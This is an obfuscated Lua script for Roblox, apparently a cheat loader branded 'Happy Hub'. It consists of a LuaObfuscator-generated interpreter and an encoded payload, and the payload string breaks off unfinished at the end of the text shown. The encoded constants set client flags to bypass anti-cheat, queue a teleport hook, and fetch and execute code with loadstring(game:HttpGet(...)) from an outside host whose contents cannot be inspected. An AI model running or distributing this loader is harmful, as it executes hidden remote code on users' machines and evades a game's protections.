	--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 

]]--

local v0 = tonumber;
local v1 = string.byte;
local v2 = string.char;
local v3 = string.sub;
local v4 = string.gsub;
local v5 = string.rep;
local v6 = table.concat;
local v7 = table.insert;
local v8 = math.ldexp;
local v9 = getfenv or function()
	return _ENV;
end;
local v10 = setmetatable;
local v11 = pcall;
local v12 = select;
local v13 = unpack or table.unpack;
local v14 = tonumber;
local function v15(v16, v17, ...)
	local v18 = 1;
	local v19;
	v16 = v4(v3(v16, 5), "..", function(v30)
		if (v1(v30, 2) == 81) then
			v19 = v0(v3(v30, 1, 1));
			return "";
		else
			local v89 = 0;
			local v90;
			while true do
				if (v89 == 0) then
					v90 = v2(v0(v30, 16));
					if v19 then
						local v119 = 0;
						local v120;
						while true do
							if (v119 == 1) then
								return v120;
							end
							if (v119 == 0) then
								v120 = v5(v90, v19);
								v19 = nil;
								v119 = 1;
							end
						end
					else
						return v90;
					end
					break;
				end
			end
		end
	end);
	local function v20(v31, v32, v33)
		if v33 then
			local v91 = (v31 / (((882 - (282 + 595)) - 3) ^ (v32 - 1))) % ((5 - 3) ^ (((v33 - (1638 - (1523 + 114))) - (v32 - (1 - 0))) + ((2 + 0) - 1)));
			return v91 - (v91 % (620 - (555 + 64)));
		else
			local v92 = 931 - (857 + 74);
			local v93;
			while true do
				if (v92 == 0) then
					v93 = (570 - (367 + 201)) ^ (v32 - (928 - (214 + 713)));
					return (((v31 % (v93 + v93)) >= v93) and (1 + 0)) or (0 + 0);
				end
			end
		end
	end
	local function v21()
		local v34 = v1(v16, v18, v18);
		v18 = v18 + 1;
		return v34;
	end
	local function v22()
		local v35, v36 = v1(v16, v18, v18 + (2 - 0));
		v18 = v18 + (1067 - (68 + 997));
		return (v36 * (1526 - (226 + 1044))) + v35;
	end
	local function v23()
		local v37 = 0 - (0 - 0);
		local v38;
		local v39;
		local v40;
		local v41;
		while true do
			if (v37 == (118 - (32 + 85))) then
				return (v41 * (16441815 + 335401)) + (v40 * 65536) + (v39 * 256) + v38;
			end
			if (v37 == ((350 - (87 + 263)) + 0)) then
				v38, v39, v40, v41 = v1(v16, v18, v18 + (960 - ((1072 - (67 + 113)) + 65)));
				v18 = v18 + (9 - 5);
				v37 = 1 - 0;
			end
		end
	end
	local function v24()
		local v42 = v23();
		local v43 = v23();
		local v44 = 1;
		local v45 = (v20(v43, (792 - (368 + 423)) + 0, (153 - 104) - (47 - (10 + 8))) * ((2 + 0) ^ 32)) + v42;
		local v46 = v20(v43, (318 - 235) - 62, 983 - (802 + 150));
		local v47 = ((v20(v43, 85 - 53) == (1 - (442 - (416 + 26)))) and -(1 + 0)) or (998 - (915 + 82));
		if (v46 == (0 - (0 - 0))) then
			if (v45 == (0 + 0)) then
				return v47 * (0 - 0);
			else
				v46 = (510 + 678) - (1069 + 118);
				v44 = 0 - 0;
			end
		elseif (v46 == (4477 - 2430)) then
			return ((v45 == (0 + 0)) and (v47 * (1 / 0))) or (v47 * NaN);
		end
		return v8(v47, v46 - (1817 - 794)) * (v44 + (v45 / (2 ^ (52 + 0))));
	end
	local function v25(v48)
		local v49;
		if not v48 then
			local v94 = 0 - 0;
			while true do
				if (v94 == (438 - (119 + 26 + 293))) then
					v48 = v23();
					if (v48 == (430 - (44 + 386))) then
						return "";
					end
					break;
				end
			end
		end
		v49 = v3(v16, v18, (v18 + v48) - (1487 - (998 + 488)));
		v18 = v18 + v48;
		local v50 = {};
		for v66 = 1 + 0, #v49 do
			v50[v66] = v2(v1(v3(v49, v66, v66)));
		end
		return v6(v50);
	end
	local v26 = v23;
	local function v27(...)
		return {...}, v12("#", ...);
	end
	local function v28()
		local v51 = (function()
			return function(v95, v96, v97, v98, v99, v100, v101, v102, v103)
				local v104 = (function()
					return 0 + 0;
				end)();
				local v95 = (function()
					return;
				end)();
				local v96 = (function()
					return;
				end)();
				while true do
					if (v104 ~= (1637 - (195 + 1442))) then
					else
						local v117 = (function()
							return 0 - 0;
						end)();
						while true do
							if (v117 ~= 1) then
							else
								v104 = (function()
									return 561 - (306 + 254);
								end)();
								break;
							end
							if (v117 == (0 + 0)) then
								v95 = (function()
									return 0 + 0;
								end)();
								v96 = (function()
									return nil;
								end)();
								v117 = (function()
									return 1 + 0;
								end)();
							end
						end
					end
					if (v104 == (397 - (115 + 281))) then
						local v118 = (function()
							return 0;
						end)();
						while true do
							if (v118 == (0 + 0)) then
								while true do
									if (v95 == 0) then
										v96 = (function()
											return v97();
										end)();
										if (v98(v96, #"!", #" ") ~= (0 - 0)) then
										else
											local v234 = (function()
												return 0;
											end)();
											local v235 = (function()
												return;
											end)();
											local v236 = (function()
												return;
											end)();
											local v237 = (function()
												return;
											end)();
											local v238 = (function()
												return;
											end)();
											while true do
												if (v234 == (1 + 0)) then
													v237 = (function()
														return nil;
													end)();
													v238 = (function()
														return nil;
													end)();
													v234 = (function()
														return 4 - 2;
													end)();
												end
												if (v234 ~= (7 - 5)) then
												else
													while true do
														if (v235 ~= #"!") then
														else
															local v337 = (function()
																return 867 - (550 + 317);
															end)();
															local v338 = (function()
																return;
															end)();
															while true do
																if (v337 == (0 - 0)) then
																	v338 = (function()
																		return 0 - 0;
																	end)();
																	while true do
																		if (v338 ~= (0 - 0)) then
																		else
																			v238 = (function()
																				return {v99(),v99(),nil,nil};
																			end)();
																			if (v236 == 0) then
																				local v347 = (function()
																					return 572 - (426 + 146);
																				end)();
																				local v348 = (function()
																					return;
																				end)();
																				while true do
																					if (v347 ~= (285 - (134 + 151))) then
																					else
																						v348 = (function()
																							return 0;
																						end)();
																						while true do
																							if (v348 ~= (1665 - (970 + 695))) then
																							else
																								v238[#"91("] = (function()
																									return v99();
																								end)();
																								v238[#"0313"] = (function()
																									return v99();
																								end)();
																								break;
																							end
																						end
																						break;
																					end
																				end
																			elseif (v236 == #">") then
																				v238[#"19("] = (function()
																					return v100();
																				end)();
																			elseif (v236 == (3 - 1)) then
																				v238[#"91("] = (function()
																					return v100() - (2 ^ (46 - 30));
																				end)();
																			elseif (v236 ~= #"xxx") then
																			else
																				local v355 = (function()
																					return 1990 - (582 + 1408);
																				end)();
																				local v356 = (function()
																					return;
																				end)();
																				while true do
																					if (v355 ~= 0) then
																					else
																						v356 = (function()
																							return 0;
																						end)();
																						while true do
																							if (v356 ~= (0 - 0)) then
																							else
																								v238[#"91("] = (function()
																									return v100() - ((2 - 0) ^ (1040 - (706 + 318)));
																								end)();
																								v238[#"xnxx"] = (function()
																									return v99();
																								end)();
																								break;
																							end
																						end
																						break;
																					end
																				end
																			end
																			v338 = (function()
																				return 3 - 2;
																			end)();
																		end
																		if (v338 == 1) then
																			v235 = (function()
																				return 2;
																			end)();
																			break;
																		end
																	end
																	break;
																end
															end
														end
														if (v235 == #"asd") then
															if (v98(v237, #"-19", #"19(") == #"\\") then
																v238[#".dev"] = (function()
																	return v101[v238[#"0836"]];
																end)();
															end
															v102[v103] = (function()
																return v238;
															end)();
															break;
														end
														if (v235 ~= (1253 - (721 + 530))) then
														else
															local v340 = (function()
																return 1271 - (945 + 326);
															end)();
															local v341 = (function()
																return;
															end)();
															while true do
																if ((1824 - (1195 + 629)) ~= v340) then
																else
																	v341 = (function()
																		return 0 + 0;
																	end)();
																	while true do
																		if (v341 ~= 1) then
																		else
																			v235 = (function()
																				return #"91(";
																			end)();
																			break;
																		end
																		if (0 == v341) then
																			if (v98(v237, #"~", #",") == #"|") then
																				v238[2 - 0] = (function()
																					return v101[v238[243 - (187 + 54)]];
																				end)();
																			end
																			if (v98(v237, 702 - (271 + 429), 2) == #"[") then
																				v238[#"gha"] = (function()
																					return v101[v238[#"91("]];
																				end)();
																			end
																			v341 = (function()
																				return 781 - (162 + 618);
																			end)();
																		end
																	end
																	break;
																end
															end
														end
														if (v235 ~= 0) then
														else
															local v342 = (function()
																return 0 + 0;
															end)();
															local v343 = (function()
																return;
															end)();
															while true do
																if (v342 == (1086 - (461 + 625))) then
																	v343 = (function()
																		return 0;
																	end)();
																	while true do
																		if (v343 == 1) then
																			v235 = (function()
																				return #"\\";
																			end)();
																			break;
																		end
																		if (v343 ~= (1288 - (993 + 295))) then
																		else
																			v236 = (function()
																				return v98(v96, 1 + 1, #"xxx");
																			end)();
																			v237 = (function()
																				return v98(v96, #"0313", 6);
																			end)();
																			v343 = (function()
																				return 1172 - (418 + 753);
																			end)();
																		end
																	end
																	break;
																end
															end
														end
													end
													break;
												end
												if (0 == v234) then
													local v332 = (function()
														return 0 + 0;
													end)();
													local v333 = (function()
														return;
													end)();
													while true do
														if (v332 == 0) then
															v333 = (function()
																return 0 + 0;
															end)();
															while true do
																if (v333 == (0 + 0)) then
																	v235 = (function()
																		return 0 - 0;
																	end)();
																	v236 = (function()
																		return nil;
																	end)();
																	v333 = (function()
																		return 1 - 0;
																	end)();
																end
																if (v333 == 1) then
																	v234 = (function()
																		return 530 - (406 + 123);
																	end)();
																	break;
																end
															end
															break;
														end
													end
												end
											end
										end
										break;
									end
								end
								return v95, v96, v97, v98, v99, v100, v101, v102, v103;
							end
						end
					end
				end
			end;
		end)();
		local v52 = (function()
			return function(v105, v106, v107)
				local v108 = (function()
					return 1769 - (1749 + 20);
				end)();
				local v109 = (function()
					return;
				end)();
				while true do
					if (v108 ~= (0 + 0)) then
					else
						v109 = (function()
							return 0;
						end)();
						while true do
							if ((0 + 0) == v109) then
								local v123 = (function()
									return 0;
								end)();
								while true do
									if (v123 == (1636 - (1373 + 263))) then
										local v127 = (function()
											return 1000 - (451 + 549);
										end)();
										while true do
											if (0 == v127) then
												v105[v106 - #"\\"] = (function()
													return v107();
												end)();
												return v105, v106, v107;
											end
										end
									end
								end
							end
						end
						break;
					end
				end
			end;
		end)();
		local v53 = (function()
			return {};
		end)();
		local v54 = (function()
			return {};
		end)();
		local v55 = (function()
			return {};
		end)();
		local v56 = (function()
			return {v53,v54,nil,v55};
		end)();
		local v57 = (function()
			return v23();
		end)();
		local v58 = (function()
			return {};
		end)();
		for v68 = #"}", v57 do
			local v69 = (function()
				return 0 - 0;
			end)();
			local v70 = (function()
				return;
			end)();
			local v71 = (function()
				return;
			end)();
			local v72 = (function()
				return;
			end)();
			while true do
				if (v69 == (1146 - (466 + 679))) then
					v72 = (function()
						return nil;
					end)();
					while true do
						if (v70 == (0 - 0)) then
							local v121 = (function()
								return 0 - 0;
							end)();
							while true do
								if (v121 ~= 0) then
								else
									v71 = (function()
										return v21();
									end)();
									v72 = (function()
										return nil;
									end)();
									v121 = (function()
										return 1901 - (106 + 1794);
									end)();
								end
								if (v121 == 1) then
									v70 = (function()
										return 1385 - (746 + 638);
									end)();
									break;
								end
							end
						end
						if (v70 == (1 + 0)) then
							if (v71 == #"~") then
								v72 = (function()
									return v21() ~= 0;
								end)();
							elseif (v71 == (1 + 1)) then
								v72 = (function()
									return v24();
								end)();
							elseif (v71 == #"gha") then
								v72 = (function()
									return v25();
								end)();
							end
							v58[v68] = (function()
								return v72;
							end)();
							break;
						end
					end
					break;
				end
				if (v69 ~= (0 + 0)) then
				else
					v70 = (function()
						return 0 - 0;
					end)();
					v71 = (function()
						return nil;
					end)();
					v69 = (function()
						return 342 - (218 + 123);
					end)();
				end
			end
		end
		v56[#"asd"] = (function()
			return v21();
		end)();
		for v73 = #"!", v23() do
			FlatIdent_475BC, Descriptor, v21, v20, v22, v23, v58, v53, v73 = (function()
				return v51(FlatIdent_475BC, Descriptor, v21, v20, v22, v23, v58, v53, v73);
			end)();
		end
		for v74 = #">", v23() do
			v54, v74, v28 = (function()
				return v52(v54, v74, v28);
			end)();
		end
		return v56;
	end
	local function v29(v60, v61, v62)
		local v63 = v60[115 - (4 + 110)];
		local v64 = v60[586 - (57 + 527)];
		local v65 = v60[1430 - (41 + 1386)];
		return function(...)
			local v75 = v63;
			local v76 = v64;
			local v77 = v65;
			local v78 = v27;
			local v79 = 104 - (17 + 36 + 50);
			local v80 = -(1 + 0);
			local v81 = {};
			local v82 = {...};
			local v83 = v12("#", ...) - (2 - 1);
			local v84 = {};
			local v85 = {};
			for v110 = 166 - (122 + 44), v83 do
				if ((v110 >= v77) or (2652 <= 1533)) then
					v81[v110 - v77] = v82[v110 + (1 - 0)];
				else
					v85[v110] = v82[v110 + (3 - 2)];
				end
			end
			local v86 = (v83 - v77) + 1;
			local v87;
			local v88;
			while true do
				v87 = v75[v79];
				v88 = v87[1 + 0];
				if ((v88 <= (2 + 1 + 11)) or (3598 < 1460) or (699 >= 1296)) then
					if ((v88 <= 6) or (4116 < 1192)) then
						if ((v88 <= (3 - 1)) or (3377 <= 903)) then
							if (v88 <= (65 - (30 + 35))) then
								local v124 = v87[2];
								local v125 = {v85[v124](v13(v85, v124 + 1 + 0, v87[3]))};
								local v126 = 1257 - (1043 + 214);
								for v128 = v124, v87[4] do
									local v129 = 0 - 0;
									while true do
										if ((3976 >= 439) and (v129 == (1212 - (323 + 889)))) then
											v126 = v126 + (2 - 1);
											v85[v128] = v125[v126];
											break;
										end
									end
								end
							elseif ((3752 == 3752) and (v88 > (581 - (361 + 219)))) then
								v62[v87[3]] = v85[v87[322 - (53 + 267)]];
							else
								local v134 = v87[1 + 1];
								v85[v134] = v85[v134](v13(v85, v134 + 1, v87[(405 + 11) - (15 + 398)]));
							end
						elseif ((v88 <= 4) or (1783 >= 3616)) then
							if (v88 == (985 - (18 + 964))) then
								local v136 = 0 - 0;
								local v137;
								while true do
									if (((4046 > 2695) and (v136 == (0 + 0))) or (3913 > 4527)) then
										v137 = v87[2 + 0];
										v85[v137] = v85[v137](v13(v85, v137 + 1, v80));
										break;
									end
								end
							else
								local v138 = 850 - ((78 - 58) + 830);
								local v139;
								while true do
									if ((v138 == (4 + 1)) or (3545 == 3197)) then
										v79 = v79 + (127 - (116 + 10));
										v87 = v75[v79];
										if ((4376 > 817) and v85[v87[2]]) then
											v79 = v79 + 1 + 0;
										else
											v79 = v87[3];
										end
										break;
									end
									if (v138 == 1) then
										v87 = v75[v79];
										v85[v87[740 - (542 + 196)]] = v87[3];
										v79 = v79 + (1 - 0);
										v138 = 2;
									end
									if ((4861 > 824) and (v138 == (1 + 1))) then
										v87 = v75[v79];
										v85[v87[2]] = v87[2 + 1];
										v79 = v79 + 1 + (1726 - (1668 + 58));
										v138 = 7 - 4;
									end
									if (((0 - 0) == v138) or (1383 >= 2131)) then
										v139 = nil;
										v85[v87[1553 - (1126 + 425)]] = v62[v87[408 - ((744 - (512 + 114)) + 287)]];
										v79 = v79 + (3 - (5 - 3));
										v138 = 1;
									end
									if (v138 == (1125 - (118 + 1003))) then
										v79 = v79 + ((3 - 1) - (3 - 2));
										v87 = v75[v79];
										v85[v87[1 + 1]] = v85[v87[3]];
										v138 = (72 + 310) - (142 + 235);
									end
									if (v138 == (13 - 10)) then
										v87 = v75[v79];
										v139 = v87[2];
										v85[v139] = v85[v139](v13(v85, v139 + 1 + 0, v87[980 - (553 + 424)]));
										v138 = 4;
									end
								end
							end
						elseif (v88 == (5 + 0)) then
							v85[v87[3 - (3 - 2)]] = v62[v87[3 + 0]];
						else
							do
								return;
							end
						end
					elseif (v88 <= (10 + 0)) then
						if ((v88 <= (5 + 3)) or (1876 >= 2541)) then
							if (v88 > (3 + 4)) then
								local v142 = v87[2 + 0];
								v85[v142](v13(v85, v142 + (2 - 1), v87[7 - 4]));
							else
								local v143 = v87[4 - 2];
								local v144, v145 = v78(v85[v143](v13(v85, v143 + 1 + 0, v87[3])));
								v80 = (v145 + v143) - ((1998 - (109 + 1885)) - 3);
								local v146 = 753 - (239 + 514);
								for v239 = v143, v80 do
									v146 = v146 + 1 + 0;
									v85[v239] = v144[v146];
								end
							end
						elseif (v88 > 9) then
							local v147;
							local v148;
							v148 = v87[1331 - (797 + 532)];
							v147 = v85[v87[3 + 0]];
							v85[v148 + 1 + 0] = v147;
							v85[v148] = v147[v87[9 - 5]];
							v79 = v79 + (1203 - (373 + 829));
							v87 = v75[v79];
							v85[v87[733 - (476 + 255)]] = v87[1133 - (369 + 761)];
							v79 = v79 + 1 + 0;
							v87 = v75[v79];
							v148 = v87[2 - (1469 - (1269 + 200))];
							v85[v148] = v85[v148](v13(v85, v148 + ((1 - 0) - 0), v87[(1056 - (98 + 717)) - (64 + (1000 - (802 + 24)))]));
							v79 = v79 + 1 + 0;
							v87 = v75[v79];
							v85[v87[2 - 0]] = v85[v87[339 - (144 + 192)]][v87[220 - (42 + 174)]];
							v79 = v79 + 1;
							v87 = v75[v79];
							v148 = v87[2 + 0];
							v147 = v85[v87[3]];
							v85[v148 + 1] = v147;
							v85[v148] = v147[v87[4 + 0]];
							v79 = v79 + 1 + 0;
							v87 = v75[v79];
							v85[v87[2]] = v87[1507 - (363 + 1141)];
							v79 = v79 + (1581 - (1183 + 397));
							v87 = v75[v79];
							v148 = v87[5 - (5 - 2)];
							v85[v148](v13(v85, v148 + 1, v87[3]));
							v79 = v79 + 1;
							v87 = v75[v79];
							v85[v87[2]] = v62[v87[(3 - 0) + 0]];
							v79 = v79 + 1 + 0 + 0;
							v87 = v75[v79];
							v85[v87[(1519 + 458) - (1913 + 62)]] = v85[v87[2 + 1 + 0]][v87[10 - 6]];
							v79 = v79 + (1934 - (565 + 1368));
							v87 = v75[v79];
							v85[v87[7 - 5]] = v87[1664 - (1477 + 184)];
						else
							local v172 = (0 + 0) - 0;
							local v173;
							while true do
								if (v172 == (0 + 0)) then
									v173 = v87[858 - (564 + 292)];
									v85[v173] = v85[v173]();
									break;
								end
							end
						end
					elseif (v88 <= (20 - 8)) then
						if (v88 == (33 - 22)) then
							local v174 = 304 - (244 + 60);
							local v175;
							local v176;
							while true do
								if (v174 == (0 + 0)) then
									v175 = nil;
									v176 = nil;
									v85[v87[478 - (41 + 435)]] = v87[(2792 - 1788) - (938 + (209 - 146))];
									v79 = v79 + 1;
									v174 = 1;
								end
								if ((2394 > 373) and (v174 == (2 + 0))) then
									v87 = v75[v79];
									v85[v87[2]] = v62[v87[1128 - (936 + 68 + 121)]];
									v79 = v79 + 1 + 0;
									v87 = v75[v79];
									v174 = (658 + 958) - (1565 + 48);
								end
								if ((4 + 1) == v174) then
									v87 = v75[v79];
									v176 = v87[(941 + 199) - (569 + 213 + 356)];
									v85[v176] = v85[v176](v13(v85, v176 + ((126 + 142) - (176 + (1524 - (797 + 636)))), v87[3]));
									v79 = v79 + (2 - 1);
									v174 = 6;
								end
								if (v174 == 4) then
									v79 = v79 + (1 - 0);
									v87 = v75[v79];
									v85[v87[1094 - (975 + 117)]] = v87[1878 - (157 + 1718)];
									v79 = v79 + 1 + 0;
									v174 = 17 - 12;
								end
								if ((1782 <= 3772) and (4155 <= 4232) and (v174 == (20 - 14))) then
									v87 = v75[v79];
									v176 = v87[2];
									v175 = v85[v87[1021 - (697 + (1558 - 1237))]];
									v85[v176 + (2 - 1)] = v175;
									v174 = 14 - 7;
								end
								if ((v174 == 3) or (4700 < 813)) then
									v176 = v87[4 - 2];
									v175 = v85[v87[2 + 1]];
									v85[v176 + (1 - 0)] = v175;
									v85[v176] = v175[v87[10 - (1625 - (1427 + 192))]];
									v174 = 1231 - (322 + 905);
								end
								if ((v174 == (619 - (602 + 9))) or (3581 == 3473)) then
									v79 = v79 + (1190 - (449 + 740));
									v87 = v75[v79];
									v85[v87[874 - (826 + 46)]] = v85[v87[950 - (245 + 702)]][v87[12 - 8]];
									v79 = v79 + 1 + 0;
									v174 = 1907 - (260 + 1638);
								end
								if ((3199 < 4050) and (v174 == ((156 + 293) - (382 + 58)))) then
									v87 = v75[v79];
									v85[v87[(13 - 7) - 4]] = v62[v87[3]];
									break;
								end
								if (((4995 > 3348) and (v174 == 1)) or (4951 < 4430)) then
									v87 = v75[v79];
									v176 = v87[2 + 0];
									v85[v176](v85[v176 + (1 - 0)]);
									v79 = v79 + 1;
									v174 = 5 - 3;
								end
								if (7 == v174) then
									v85[v176] = v175[v87[1209 - (902 + 303)]];
									v79 = v79 + ((1 + 0) - 0);
									v87 = v75[v79];
									v85[v87[4 - 2]] = v62[v87[3]];
									v174 = 1 + 0 + 7;
								end
							end
						else
							local v177;
							local v178;
							v85[v87[1692 - (1121 + 569)]] = v62[v87[3]];
							v79 = v79 + (215 - (22 + 192));
							v87 = v75[v79];
							v178 = v87[(1011 - (192 + 134)) - (483 + (1476 - (316 + 960)))];
							v177 = v85[v87[(816 + 650) - (1404 + 46 + 13)]];
							v85[v178 + (2 - 1)] = v177;
							v85[v178] = v177[v87[4 - 0]];
							v79 = v79 + (766 - (468 + 275 + 22));
							v87 = v75[v79];
							v85[v87[564 - (334 + 228)]] = v87[10 - 7];
							v79 = v79 + (2 - (3 - 2));
							v87 = v75[v79];
							v178 = v87[2 - 0];
							v85[v178] = v85[v178](v13(v85, v178 + 1 + 0, v87[239 - (141 + 95)]));
							v79 = v79 + 1 + 0;
							v87 = v75[v79];
							v85[v87[4 - 2]] = v85[v87[(557 - (83 + 468)) - (1809 - (1202 + 604))]][v87[1 + 3]];
							v79 = v79 + 1;
							v87 = v75[v79];
							v178 = v87[5 - 3];
							v85[v178](v13(v85, v178 + 1 + 0, v87[2 + 1]));
							v79 = v79 + (1 - 0);
							v87 = v75[v79];
							v85[v87[9 - 7]] = v87[2 + 1];
							v79 = v79 + 1;
							v87 = v75[v79];
							v79 = v87[166 - (92 + 71)];
						end
					elseif (v88 > (7 + 6)) then
						v85[v87[2]]();
					else
						local v196 = v87[2];
						v85[v196](v85[v196 + 1]);
					end
				elseif (v88 <= (34 - (20 - 7))) then
					if (v88 <= (782 - (574 + 191))) then
						if ((96 == 96) and (v88 <= (13 + 2))) then
							for v130 = v87[4 - 2], v87[2 + 1] do
								v85[v130] = nil;
							end
						elseif (v88 == 16) then
							v85[v87[2]] = v85[v87[3]][v87[4]];
						else
							v79 = v87[852 - ((703 - 449) + 595)];
						end
					elseif (v88 <= (145 - (55 + 71))) then
						if (v88 > (23 - 5)) then
							if ((v85[v87[2]] == v87[1794 - (573 + 1217)]) or (754 > 3724)) then
								v79 = v79 + 1;
							else
								v79 = v87[(333 - (45 + 280)) - (5 + 0)];
							end
						else
							v85[v87[1 + 1]] = v85[v87[4 - 1]];
						end
					elseif (v88 > (959 - (714 + 225))) then
						if (v87[5 - 3] == v85[v87[5 - 1]]) then
							v79 = v79 + 1 + 0 + 0;
						else
							v79 = v87[3];
						end
					else
						local v202;
						local v203, v204;
						local v205;
						local v206;
						v85[v87[2 - 0]] = v62[v87[809 - (118 + 688)]];
						v79 = v79 + (49 - (25 + 23));
						v87 = v75[v79];
						v206 = v87[1 + 1 + 0];
						v205 = v85[v87[3]];
						v85[v206 + 1] = v205;
						v85[v206] = v205[v87[1890 - (927 + 959)]];
						v79 = v79 + (3 - 2);
						v87 = v75[v79];
						v85[v87[734 - (16 + 716)]] = v87[3];
						v79 = v79 + (1 - (0 + 0));
						v87 = v75[v79];
						v206 = v87[99 - (11 + 86)];
						v203, v204 = v78(v85[v206](v13(v85, v206 + ((1 + 1) - (1 - 0)), v87[3])));
						v80 = (v204 + v206) - 1;
						v202 = 285 - (175 + 110);
						for v242 = v206, v80 do
							v202 = v202 + (2 - 1);
							v85[v242] = v203[v202];
						end
						v79 = v79 + (4 - 3);
						v87 = v75[v79];
						v206 = v87[1798 - (503 + (3204 - (340 + 1571)))];
						v85[v206] = v85[v206](v13(v85, v206 + (2 - 1), v80));
						v79 = v79 + 1 + 0;
						v87 = v75[v79];
						v85[v87[1063 - (810 + 251)]]();
						v79 = v79 + 1 + 0;
						v87 = v75[v79];
						v79 = v87[1 + 2];
					end
				elseif (v88 <= (23 + 2)) then
					if (v88 <= 23) then
						if ((217 >= 57) and (v88 > (555 - (43 + 490)))) then
							local v220 = v87[735 - (711 + 9 + 13)];
							v85[v220] = v85[v220](v85[v220 + (3 - 2)]);
						else
							v85[v87[861 - (240 + 619)]] = v87[1 + 2];
						end
					elseif ((v88 > 24) or (2739 > 4008)) then
						v85[v87[2 - 0]][v87[1 + (1774 - (1733 + 39))]] = v87[4];
					else
						local v226 = 1744 - (1344 + 400);
						local v227;
						local v228;
						while true do
							if ((405 - (255 + 150)) == v226) then
								v227 = v87[2 + 0];
								v228 = v85[v87[(5 - 3) + (1035 - (125 + 909))]];
								v226 = 4 - 3;
							end
							if ((v226 == (3 - 2)) or (23 == 1134)) then
								v85[v227 + (1740 - ((2352 - (1096 + 852)) + 1335))] = v228;
								v85[v227] = v228[v87[410 - (83 + 100 + 223)]];
								break;
							end
						end
					end
				elseif ((v88 <= (32 - 5)) or (2693 >= 4111)) then
					if (v88 == (18 + 8)) then
						local v229 = 0 + 0;
						local v230;
						local v231;
						local v232;
						while true do
							if ((v229 == (342 - (10 + 327))) or (4316 <= 2146)) then
								v231 = {v85[v232](v13(v85, v232 + (1 - 0), v87[341 - (118 + 220)]))};
								v230 = 0;
								for v334 = v232, v87[2 + 2] do
									local v335 = 0;
									while true do
										if ((v335 == (449 - (108 + 341))) or (2070 >= 4037)) then
											v230 = v230 + 1 + 0;
											v85[v334] = v231[v230];
											break;
										end
									end
								end
								v79 = v79 + (4 - 3);
								v229 = 1499 - (711 + 782);
							end
							if (v229 == (3 - 1)) then
								v79 = v79 + (470 - (270 + 199));
								v87 = v75[v79];
								v85[v87[1 + 1]] = v62[v87[(1768 + 54) - (580 + 1239)]];
								v79 = v79 + (2 - 1);
								v229 = 3;
							end
							if (v229 == ((515 - (409 + 103)) + 0)) then
								v87 = v75[v79];
								v85[v87[1 + 1]] = v62[v87[(238 - (46 + 190)) + 1]];
								v79 = v79 + (2 - 1);
								v87 = v75[v79];
								v229 = 4;
							end
							if (v229 == (4 + (97 - (51 + 44)))) then
								v87 = v75[v79];
								v85[v87[1169 - (645 + 522)]] = v85[v87[1 + 2]];
								v79 = v79 + (1791 - (1010 + (2097 - (1114 + 203))));
								v87 = v75[v79];
								v229 = 7 + 0;
							end
							if ((2705 == 2705) and (v229 == (33 - 26))) then
								v85[v87[5 - 3]] = v85[v87[(2565 - (228 + 498)) - (1045 + 172 + 619)]];
								v79 = v79 + 1;
								v87 = v75[v79];
								v85[v87[2]] = v87[3];
								break;
							end
							if ((v229 == (0 - 0)) or (3546 <= 2809)) then
								v230 = nil;
								v231 = nil;
								v232 = nil;
								v232 = v87[2 - 0];
								v229 = 506 - (351 + 154);
							end
							if ((4904 > 2166) and ((1578 - (1281 + 293)) == v229)) then
								v85[v87[268 - (28 + 238)]] = v87[6 - 3];
								v79 = v79 + 1;
								v87 = v75[v79];
								v232 = v87[2];
								v229 = 1564 - (763 + 618 + 178);
							end
							if ((109 >= 90) and (v229 == (664 - (174 + 489)))) then
								v85[v232] = v85[v232]();
								v79 = v79 + 1;
								v87 = v75[v79];
								v85[v87[2]][v87[3 + (0 - 0)]] = v87[4 + 0];
								v229 = 1 + 1;
							end
						end
					elseif ((61 == 61) and (v85[v87[6 - (1909 - (830 + 1075))]] ~= v87[528 - (303 + 221)])) then
						v79 = v79 + 1 + 0;
					else
						v79 = v87[(1742 - (231 + 1038)) - (381 + 89)];
					end
				elseif (v88 > (25 + 3)) then
					if v85[v87[2 + 0]] then
						v79 = v79 + ((1 + 0) - 0);
					else
						v79 = v87[1159 - ((2236 - (171 + 991)) + 82)];
					end
				else
					v85[v87[3 - 1]] = v87[1787 - (214 + 1570)] ~= (1455 - (990 + 465));
				end
				v79 = v79 + (4 - 3);
			end
		end;
	end
	return v29(v28(), {}, v17)(...);
end
return v15("LOL!1E3Q00028Q00026Q00F03F03083Q00746F737472696E6703043Q007472756503053Q007063612Q6C03083Q007365742Q666C6167031F3Q00446562756752756E506172612Q6C656C4C75614F6E4D61696E54687265616403043Q0054727565027Q004003113Q0071756575655F6F6E5F74656C65706F727403573Q004Q096C6F6164737472696E672867616D653A482Q74704765742827682Q7470733A2Q2F6465762E73796E7472782E78797A2F622F3639626433376536346532343565396137332Q3533383033272Q2928290A3Q0903043Q0067616D65030A3Q0047657453657276696365030F3Q0054656C65706F72745365727669636503173Q0054656C65706F7274546F506C616365496E7374616E636503073Q00506C616365496403053Q004A6F62496403073Q00506C6179657273030B3Q004C6F63616C506C6179657203043Q004B69636B034A3Q005B48612Q7079204875625D3A20427970612Q73696E6720414320706C61736520776169742Q2E0A4A6F696E202D3E20682Q7470733A2Q2F646973636F72642E2Q672F6B59755A4373586803043Q007461736B03043Q0077616974030B3Q0046752Q6C56657273696F6E030A3Q006C6F6164737472696E6703073Q00482Q747047657403313Q00682Q7470733A2Q2F6465762E73796E7472782E78797A2F622F3639626433376536346532343565396137332Q353338303303073Q0067657467656E762Q0103083Q006765742Q666C616700A13Q0012163Q00014Q000F000100033Q0026133Q0007000100010004113Q00070001001216000100014Q000F000200023Q0012163Q00023Q0026133Q0002000100020004113Q000200012Q000F000300033Q00261300010089000100020004113Q0089000100061D0002007F00013Q0004113Q007F0001001205000400034Q0012000500034Q001700040002000200261B00040081000100040004113Q00810001001216000400014Q000F000500073Q000E150001001A000100040004113Q001A0001001216000500014Q000F000600063Q001216000400023Q00261300040015000100020004113Q001500012Q000F000700073Q0026130005002A000100010004113Q002A0001001216000800013Q00261300080024000100020004113Q00240001001216000500023Q0004113Q002A0001000E1500010020000100080004113Q00200001001216000600014Q000F000700073Q001216000800023Q0004113Q